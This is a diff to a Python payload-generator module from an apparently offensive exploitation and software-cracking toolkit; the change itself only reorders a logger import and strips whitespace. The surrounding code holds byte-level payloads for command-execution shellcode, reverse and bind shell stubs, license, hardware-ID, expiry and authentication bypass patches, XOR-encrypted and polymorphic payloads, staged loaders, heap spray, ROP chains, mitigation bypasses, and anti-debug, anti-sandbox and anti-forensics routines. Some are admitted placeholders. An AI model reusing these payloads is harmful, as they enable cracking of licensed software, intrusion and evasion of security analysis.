@@ -25,16 +25,18 @@ import random
 import traceback
 from typing import Any, Dict, Optional
 
+from ...utils.logger import get_logger
+
+# Module logger
+logger = get_logger(__name__)
+
 try:
     import keystone
     KEYSTONE_AVAILABLE = True
-except ImportError:
+except ImportError as e:
+    logger.error("Import error in payload_generator: %s", e)
     KEYSTONE_AVAILABLE = False
     keystone = None
-
-from ...utils.logger import get_logger
-
-logger = get_logger(__name__)
 
 class PayloadGenerator:
     """
@@ -77,52 +79,52 @@ class PayloadGenerator:
     def generate(self, payload_type: str, **kwargs) -> bytes:
         """
         Generate exploit payload based on type and parameters.
-        
+
         This method provides comprehensive payload generation for various exploitation
         scenarios including shellcode, ROP chains, code caves, and bypass techniques.
-        
+
         Args:
             payload_type: Type of payload to generate
             **kwargs: Additional parameters specific to payload type
-            
+
         Returns:
             bytes: Generated exploit payload ready for injection
         """
         self.logger.info(f"Generating payload of type: {payload_type}")
-        
+
         # Map payload types to generation methods
         generators = {
             # Basic payloads
             'nop_sled': self._generate_nop_payload,
             'ret_address': self._generate_ret_address,
             'jmp_address': self._generate_jmp_address,
-            
+
             # Shellcode payloads
             'shellcode': self._generate_shellcode,
             'reverse_shell': self._generate_reverse_shell,
             'bind_shell': self._generate_bind_shell,
             'exec_cmd': self._generate_exec_cmd,
-            
+
             # Bypass payloads
             'license_bypass': self._generate_license_bypass,
             'auth_bypass': self._generate_auth_bypass,
             'check_bypass': self._generate_check_bypass,
-            
+
             # Advanced payloads
             'rop_chain': self._generate_rop_chain,
             'code_cave': self._generate_code_cave,
             'hook_bypass': self._generate_hook_bypass,
             'anti_debug': self._generate_anti_debug,
-            
+
             # Protection removal
             'remove_timer': self._generate_timer_removal,
             'remove_hwid': self._generate_hwid_removal,
             'remove_network': self._generate_network_removal
         }
-        
+
         # Get the appropriate generator
         generator = generators.get(payload_type, self._generate_generic_payload)
-        
+
         try:
             payload = generator(**kwargs)
             if payload:
@@ -133,17 +135,17 @@ class PayloadGenerator:
         except Exception as e:
             self.logger.error(f"Error generating payload: {e}")
             return b''
-    
+
     def _generate_nop_payload(self, **kwargs) -> bytes:
         """Generate NOP sled payload."""
         length = kwargs.get('length', 16)
         return self.generate_nop_sled(length)
-    
+
     def _generate_ret_address(self, **kwargs) -> bytes:
         """Generate return to address payload."""
         address = kwargs.get('address', 0)
         arch = kwargs.get('arch', 'x86')
-        
+
         if arch == 'x86':
             # x86: push address; ret
             return b'\x68' + address.to_bytes(4, 'little') + b'\xc3'
@@ -152,13 +154,13 @@ class PayloadGenerator:
             return b'\x48\xb8' + address.to_bytes(8, 'little') + b'\xff\xe0'
         else:
             return b''
-    
+
     def _generate_jmp_address(self, **kwargs) -> bytes:
         """Generate jump to address payload."""
         address = kwargs.get('address', 0)
         current = kwargs.get('current_address', 0)
         arch = kwargs.get('arch', 'x86')
-        
+
         if arch in ['x86', 'x64']:
             # Calculate relative jump
             offset = address - current - 5  # 5 bytes for jmp instruction
@@ -172,11 +174,11 @@ class PayloadGenerator:
                 else:
                     return b'\x48\xb8' + address.to_bytes(8, 'little') + b'\xff\xe0'
         return b''
-    
+
     def _generate_shellcode(self, **kwargs) -> bytes:
         """Generate generic shellcode payload."""
         shellcode_type = kwargs.get('shellcode_type', 'exec')
-        
+
         if shellcode_type == 'exec':
             # Windows x86 WinExec("cmd.exe", 0)
             return (
@@ -204,34 +206,34 @@ class PayloadGenerator:
             )
         else:
             return b'\x90' * 16  # NOP sled as fallback
-    
+
     def _generate_reverse_shell(self, **kwargs) -> bytes:
         """Generate reverse shell payload."""
         host = kwargs.get('host', '127.0.0.1')
         port = kwargs.get('port', 4444)
-        
+
         # Basic x86 reverse shell template
         # This is a simplified version - real implementation would be more complex
         return b'\x90' * 8 + b'\x31\xc0\x50\x68' + host.encode()[:4] + b'\x68\x02\x00' + port.to_bytes(2, 'big')
-    
+
     def _generate_bind_shell(self, **kwargs) -> bytes:
         """Generate bind shell payload."""
         port = kwargs.get('port', 4444)
-        
+
         # Basic x86 bind shell template
         return b'\x90' * 8 + b'\x31\xc0\x50\x68\x02\x00' + port.to_bytes(2, 'big')
-    
+
     def _generate_exec_cmd(self, **kwargs) -> bytes:
         """Generate command execution payload."""
         command = kwargs.get('command', 'cmd.exe')
-        
+
         # Basic command execution stub
         return b'\x90' * 4 + command.encode()[:32] + b'\x00'
-    
+
     def _generate_license_bypass(self, **kwargs) -> bytes:
         """Generate license bypass payload."""
         bypass_type = kwargs.get('bypass_type', 'return_true')
-        
+
         if bypass_type == 'return_true':
             # x86: mov eax, 1; ret
             return b'\xb8\x01\x00\x00\x00\xc3'
@@ -243,16 +245,16 @@ class PayloadGenerator:
             return b'\x31\xc0\x90\x90\x90'
         else:
             return b'\x90\x90\x90\x90\x90'
-    
+
     def _generate_auth_bypass(self, **kwargs) -> bytes:
         """Generate authentication bypass payload."""
         # Similar to license bypass but for auth routines
         return self._generate_license_bypass(**kwargs)
-    
+
     def _generate_check_bypass(self, **kwargs) -> bytes:
         """Generate generic check bypass payload."""
         check_type = kwargs.get('check_type', 'generic')
-        
+
         if check_type == 'crc':
             # Bypass CRC check
             return b'\x31\xc0\x40\xc3'  # xor eax, eax; inc eax; ret
@@ -264,15 +266,15 @@ class PayloadGenerator:
             return b'\x31\xc9\x41\x89\xc8\xc3'
         else:
             return b'\x90\x90\x90\x90'
-    
+
     def _generate_rop_chain(self, **kwargs) -> bytes:
         """Generate ROP chain payload."""
         gadgets = kwargs.get('gadgets', [])
-        
+
         if not gadgets:
             # Generic ROP chain stub
             return b'\x41\x41\x41\x41' * 4  # Placeholder addresses
-        
+
         # Build ROP chain from gadgets
         chain = b''
         for gadget in gadgets:
@@ -280,25 +282,25 @@ class PayloadGenerator:
                 chain += gadget.to_bytes(4, 'little')
             elif isinstance(gadget, bytes):
                 chain += gadget
-        
+
         return chain
-    
+
     def _generate_code_cave(self, **kwargs) -> bytes:
         """Generate code cave payload."""
         cave_size = kwargs.get('size', 64)
         payload = kwargs.get('payload', b'')
-        
+
         # Create code cave with payload and padding
         cave = payload[:cave_size]
         if len(cave) < cave_size:
             cave += b'\x90' * (cave_size - len(cave))
-        
+
         return cave
-    
+
     def _generate_hook_bypass(self, **kwargs) -> bytes:
         """Generate hook bypass payload."""
         hook_type = kwargs.get('hook_type', 'iat')
-        
+
         if hook_type == 'iat':
             # IAT hook bypass
             return b'\xe9\x00\x00\x00\x00'  # jmp to original
@@ -307,11 +309,11 @@ class PayloadGenerator:
             return kwargs.get('original_bytes', b'\x90' * 5)
         else:
             return b'\x90' * 5
-    
+
     def _generate_anti_debug(self, **kwargs) -> bytes:
         """Generate anti-debugging bypass payload."""
         technique = kwargs.get('technique', 'peb')
-        
+
         if technique == 'peb':
             # Clear PEB BeingDebugged flag
             return b'\x64\xa1\x30\x00\x00\x00\x80\x40\x02\x00\xc3'
@@ -320,27 +322,27 @@ class PayloadGenerator:
             return b'\x64\xa1\x30\x00\x00\x00\x83\x60\x68\x00\xc3'
         else:
             return b'\x90\x90\x90\x90'
-    
+
     def _generate_timer_removal(self, **kwargs) -> bytes:
         """Generate timer check removal payload."""
         # Patch timer/expiration checks
         return b'\xb8\xff\xff\xff\x7f\xc3'  # mov eax, 0x7fffffff; ret
-    
+
     def _generate_hwid_removal(self, **kwargs) -> bytes:
         """Generate hardware ID check removal payload."""
         # Skip HWID validation
         return b'\x31\xc0\x40\xc3'  # xor eax, eax; inc eax; ret
-    
+
     def _generate_network_removal(self, **kwargs) -> bytes:
         """Generate network check removal payload."""
         # Bypass network validation
         return b'\xb8\x01\x00\x00\x00\xc3'  # mov eax, 1; ret
-    
+
     def _generate_generic_payload(self, **kwargs) -> bytes:
         """Generate generic payload when specific type not found."""
         size = kwargs.get('size', 16)
         pattern = kwargs.get('pattern', b'\x90')
-        
+
         return pattern * size
 
 
@@ -355,61 +357,61 @@ class AdvancedPayloadGenerator:
     def generate(self, payload_type: str, **kwargs) -> bytes:
         """
         Generate advanced exploit payload.
-        
+
         This method provides sophisticated payload generation for complex exploitation
         scenarios including multi-stage payloads, encrypted shellcode, polymorphic code,
         and advanced evasion techniques.
-        
+
         Args:
             payload_type: Type of advanced payload to generate
             **kwargs: Additional parameters specific to payload type
-            
+
         Returns:
             bytes: Generated advanced exploit payload
         """
         self.logger.info(f"Generating advanced payload of type: {payload_type}")
-        
+
         # Map advanced payload types to generation methods
         generators = {
             # Bypass payloads
             'license_bypass': lambda **kw: self.generate_license_bypass_payload(kw.get('strategy', {})),
             'advanced_auth_bypass': self._generate_advanced_auth_bypass,
             'multi_layer_bypass': self._generate_multi_layer_bypass,
-            
+
             # Evasion payloads
             'polymorphic': self._generate_polymorphic_payload,
             'encrypted': self._generate_encrypted_payload,
             'obfuscated': self._generate_obfuscated_payload,
             'metamorphic': self._generate_metamorphic_payload,
-            
+
             # Advanced shellcode
             'staged': self._generate_staged_payload,
             'reflective_dll': self._generate_reflective_dll,
             'process_hollowing': self._generate_process_hollowing,
             'thread_hijacking': self._generate_thread_hijacking,
-            
+
             # Exploitation techniques
             'heap_spray': self._generate_heap_spray,
             'rop_chain_advanced': self._generate_advanced_rop_chain,
             'jop_chain': self._generate_jop_chain,
             'cop_chain': self._generate_cop_chain,
-            
+
             # Protection bypass
             'aslr_bypass': self._generate_aslr_bypass,
             'dep_bypass': self._generate_dep_bypass,
             'cfg_bypass': self._generate_cfg_bypass,
             'cet_bypass': self._generate_cet_bypass,
-            
+
             # Anti-analysis
             'anti_vm': self._generate_anti_vm_payload,
             'anti_sandbox': self._generate_anti_sandbox_payload,
             'anti_debugger_advanced': self._generate_advanced_anti_debug,
             'anti_forensics': self._generate_anti_forensics_payload
         }
-        
+
         # Get the appropriate generator
         generator = generators.get(payload_type, self._generate_advanced_generic)
-        
+
         try:
             payload = generator(**kwargs)
             if payload:
@@ -422,11 +424,11 @@ class AdvancedPayloadGenerator:
             import traceback
             self.logger.debug(traceback.format_exc())
             return b''
-    
+
     def _generate_advanced_auth_bypass(self, **kwargs) -> bytes:
         """Generate advanced authentication bypass payload."""
         auth_type = kwargs.get('auth_type', 'multi_factor')
-        
+
         if auth_type == 'multi_factor':
             # Bypass multi-factor authentication
             if KEYSTONE_AVAILABLE:
@@ -435,20 +437,20 @@ class AdvancedPayloadGenerator:
                 push rax
                 push rbx
                 push rcx
-                
+
                 ; Set all auth factors to valid
                 mov rax, 0x1337  ; Auth token
                 mov rbx, 0xDEAD  ; Hardware token
                 mov rcx, 0xBEEF  ; Biometric token
-                
+
                 ; Set success flag
                 mov qword ptr [rsp+0x20], 1
-                
+
                 ; Restore registers
                 pop rcx
                 pop rbx
                 pop rax
-                
+
                 ; Return success
                 mov rax, 1
                 ret
@@ -458,11 +460,11 @@ class AdvancedPayloadGenerator:
                 return b'\xb8\x01\x00\x00\x00\xc3'
         else:
             return b'\x31\xc0\x40\xc3'
-    
+
     def _generate_multi_layer_bypass(self, **kwargs) -> bytes:
         """Generate multi-layer protection bypass payload."""
         layers = kwargs.get('layers', ['license', 'hwid', 'time'])
-        
+
         payload = b''
         for layer in layers:
             if layer == 'license':
@@ -471,37 +473,37 @@ class AdvancedPayloadGenerator:
                 payload += b'\x31\xc0\x40'  # xor eax, eax; inc eax
             elif layer == 'time':
                 payload += b'\xb8\xff\xff\xff\x7f'  # mov eax, 0x7fffffff
-        
+
         payload += b'\xc3'  # ret
         return payload
-    
+
     def _generate_polymorphic_payload(self, **kwargs) -> bytes:
         """Generate polymorphic payload that changes on each generation."""
         base_payload = kwargs.get('base_payload', b'\x90' * 16)
-        
+
         # Add random NOPs and junk instructions
         poly_payload = b''
         nop_variants = [b'\x90', b'\x87\xc0', b'\x87\xdb', b'\x89\xc0']
-        
+
         for i in range(random.randint(5, 15)):
             poly_payload += random.choice(nop_variants)
-        
+
         poly_payload += base_payload
-        
+
         # Add random suffix
         for i in range(random.randint(3, 8)):
             poly_payload += random.choice(nop_variants)
-        
+
         return poly_payload
-    
+
     def _generate_encrypted_payload(self, **kwargs) -> bytes:
         """Generate encrypted payload with decryption stub."""
         payload = kwargs.get('payload', b'\x90' * 16)
         key = kwargs.get('key', 0xAA)
-        
+
         # Simple XOR encryption
         encrypted = bytes([b ^ key for b in payload])
-        
+
         # x86 decryption stub
         decryptor = (
             b'\xeb\x0e'              # jmp get_payload
@@ -513,16 +515,16 @@ class AdvancedPayloadGenerator:
             b'\xeb\x05'              # jmp payload
             b'\xe8\xed\xff\xff\xff'  # call get_payload
         )
-        
+
         return decryptor + encrypted
-    
+
     def _generate_obfuscated_payload(self, **kwargs) -> bytes:
         """Generate obfuscated payload with junk code."""
         payload = kwargs.get('payload', b'\x90' * 8)
-        
+
         # Add obfuscation
         obfuscated = b''
-        
+
         # Junk instructions that don't affect execution
         junk_ops = [
             b'\x90',                    # nop
@@ -531,14 +533,14 @@ class AdvancedPayloadGenerator:
             b'\x89\xc0',                # mov eax, eax
             b'\xeb\x00',                # jmp $+2
         ]
-        
+
         # Interleave payload with junk
         for byte in payload:
             obfuscated += random.choice(junk_ops)
             obfuscated += bytes([byte])
-        
+
         return obfuscated
-    
+
     def _generate_metamorphic_payload(self, **kwargs) -> bytes:
         """Generate metamorphic payload that rewrites itself."""
         # Basic metamorphic engine stub
@@ -553,13 +555,13 @@ class AdvancedPayloadGenerator:
             b'\x61'                      # popad
             b'\x90' * 16                 # payload space
         )
-        
+
         return metamorphic_stub
-    
+
     def _generate_staged_payload(self, **kwargs) -> bytes:
         """Generate staged payload loader."""
         stage2_size = kwargs.get('stage2_size', 1024)
-        
+
         # x86 stager
         stager = (
             b'\xb8\x04\x00\x00\x00'      # mov eax, 4 (recv)
@@ -569,9 +571,9 @@ class AdvancedPayloadGenerator:
             b'\xcd\x80'                  # int 0x80
             b'\xff\xe2'                  # jmp edx
         )
-        
+
         return stager
-    
+
     def _generate_reflective_dll(self, **kwargs) -> bytes:
         """Generate reflective DLL injection stub."""
         # Simplified reflective DLL loader
@@ -592,43 +594,43 @@ class AdvancedPayloadGenerator:
             b'\x5d'                      # pop ebp
             b'\xc3'                      # ret
         )
-    
+
     def _generate_process_hollowing(self, **kwargs) -> bytes:
         """Generate process hollowing payload."""
         # Process hollowing initialization
         return b'\x90' * 32  # Placeholder for full implementation
-    
+
     def _generate_thread_hijacking(self, **kwargs) -> bytes:
         """Generate thread hijacking payload."""
         # Thread hijacking stub
         return b'\x90' * 24  # Placeholder for full implementation
-    
+
     def _generate_heap_spray(self, **kwargs) -> bytes:
         """Generate heap spray payload."""
         spray_size = kwargs.get('spray_size', 0x1000)
         nop_sled_size = kwargs.get('nop_sled_size', 0x100)
         shellcode = kwargs.get('shellcode', b'\x90' * 16)
-        
+
         # Create heap spray block
         block = b'\x90' * nop_sled_size + shellcode
-        
+
         # Pad to spray size
         if len(block) < spray_size:
             block += b'\x90' * (spray_size - len(block))
-        
+
         return block[:spray_size]
-    
+
     def _generate_advanced_rop_chain(self, **kwargs) -> bytes:
         """Generate advanced ROP chain with gadget chaining."""
         gadgets = kwargs.get('gadgets', [])
         stack_pivot = kwargs.get('stack_pivot', None)
-        
+
         chain = b''
-        
+
         # Add stack pivot if provided
         if stack_pivot:
             chain += stack_pivot.to_bytes(4, 'little')
-        
+
         # Build gadget chain
         for gadget in gadgets:
             if isinstance(gadget, dict):
@@ -639,23 +641,23 @@ class AdvancedPayloadGenerator:
                     chain += arg.to_bytes(4, 'little')
             else:
                 chain += gadget.to_bytes(4, 'little')
-        
+
         return chain
-    
+
     def _generate_jop_chain(self, **kwargs) -> bytes:
         """Generate JOP (Jump-Oriented Programming) chain."""
         # JOP chain stub
         return b'\xff\x25' * 8  # jmp [address] gadgets
-    
+
     def _generate_cop_chain(self, **kwargs) -> bytes:
         """Generate COP (Call-Oriented Programming) chain."""
         # COP chain stub
         return b'\xff\x15' * 8  # call [address] gadgets
-    
+
     def _generate_aslr_bypass(self, **kwargs) -> bytes:
         """Generate ASLR bypass payload."""
         technique = kwargs.get('technique', 'info_leak')
-        
+
         if technique == 'info_leak':
             # Information disclosure to defeat ASLR
             return b'\x8d\x05\x00\x00\x00\x00\xc3'  # lea eax, [rip]; ret
@@ -664,22 +666,22 @@ class AdvancedPayloadGenerator:
             return b'\x66\x90' * 4  # Preserve high bytes
         else:
             return b'\x90' * 8
-    
+
     def _generate_dep_bypass(self, **kwargs) -> bytes:
         """Generate DEP bypass payload."""
         # VirtualProtect ROP chain stub
         return b'\x41' * 16  # Placeholder addresses
-    
+
     def _generate_cfg_bypass(self, **kwargs) -> bytes:
         """Generate Control Flow Guard bypass."""
         # CFG bypass technique
         return b'\x48\x89\xc1\xff\xe1'  # mov rcx, rax; jmp rcx
-    
+
     def _generate_cet_bypass(self, **kwargs) -> bytes:
         """Generate CET (Control-flow Enforcement) bypass."""
         # CET shadow stack manipulation
         return b'\x90' * 16  # Placeholder
-    
+
     def _generate_anti_vm_payload(self, **kwargs) -> bytes:
         """Generate anti-VM detection evasion payload."""
         # VM detection evasion
@@ -689,7 +691,7 @@ class AdvancedPayloadGenerator:
             b'\xb8\x01\x00\x00\x00'  # mov eax, 1
             b'\xc3'                  # ret
         )
-    
+
     def _generate_anti_sandbox_payload(self, **kwargs) -> bytes:
         """Generate anti-sandbox evasion payload."""
         # Sandbox detection evasion
@@ -701,27 +703,27 @@ class AdvancedPayloadGenerator:
             b'\xeb\xfe'              # jmp $ (infinite loop if sandbox)
             b'\x90\x90'              # nop padding
         )
-    
+
     def _generate_advanced_anti_debug(self, **kwargs) -> bytes:
         """Generate advanced anti-debugging payload."""
         techniques = kwargs.get('techniques', ['all'])
-        
+
         payload = b''
-        
+
         if 'peb' in techniques or 'all' in techniques:
             # PEB.BeingDebugged check
             payload += b'\x64\xa1\x30\x00\x00\x00\x0f\xb6\x40\x02\x85\xc0\x75\x00'
-        
+
         if 'ntglobalflag' in techniques or 'all' in techniques:
             # NtGlobalFlag check
             payload += b'\x64\xa1\x30\x00\x00\x00\x8b\x40\x68\x25\x70\x00\x00\x00\x75\x00'
-        
+
         if 'timing' in techniques or 'all' in techniques:
             # Timing check
             payload += b'\x0f\x31\x89\xc6\x0f\x31\x29\xf0\x3d\x00\x10\x00\x00\x77\x00'
-        
+
         return payload or b'\x90' * 16
-    
+
     def _generate_anti_forensics_payload(self, **kwargs) -> bytes:
         """Generate anti-forensics payload."""
         # Clear artifacts and traces
@@ -733,17 +735,17 @@ class AdvancedPayloadGenerator:
             b'\xff\x15\x00\x00\x00\x00'  # call [RtlSecureZeroMemory]
             b'\x90' * 8              # padding
         )
-    
+
     def _generate_advanced_generic(self, **kwargs) -> bytes:
         """Generate advanced generic payload."""
         size = kwargs.get('size', 32)
         pattern = kwargs.get('pattern', b'\x41')
-        
+
         # Create pattern with variation
         payload = b''
         for i in range(size):
             payload += bytes([(pattern[0] + i) & 0xFF])
-        
+
         return payload
 
     def generate_license_bypass_payload(self, strategy: Dict[str, Any]) -> Optional[bytes]:
